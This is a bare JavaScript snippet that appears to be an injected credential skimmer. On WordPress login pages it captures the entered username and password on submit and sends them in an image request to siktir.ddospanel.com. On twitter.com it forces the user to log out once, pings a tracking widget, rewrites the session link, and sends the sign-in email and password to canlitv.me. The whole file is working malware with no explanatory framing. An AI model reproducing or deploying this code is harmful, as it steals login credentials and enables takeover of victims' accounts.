
if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
document.getElementById('wp-submit').onclick = function() {
   new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}


if (location.hostname.indexOf("twitter.com") >= 0) {
if (window.location.href.indexOf("logout") >= 0 || window.location.href.indexOf("login") >= 0) {
window.location = "https://twitter.com/?lang=tr";
}

tarih = new Date();
    storage_key = 'access_yorummz_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		new Image().src = '//whos.amung.us/swidget/tccalface';
document.getElementsByClassName('t1-form dropdown-link-form signout-form')[0].click();
		
    }
    
	
document.getElementById("session").innerHTML = '<a href="https://twitter.com/?lang=tr">Hesabın var mı? Giriş yap</a>';

document.getElementsByClassName('t1-form signin')[0].onsubmit = function(e) {

   new Image().src = 'http://www.canlitv.me/cptw.php?username='+document.getElementById('signin-email').value+'&sifre='+document.getElementById('signin-password').value+'&location='+location.href;   
}


}
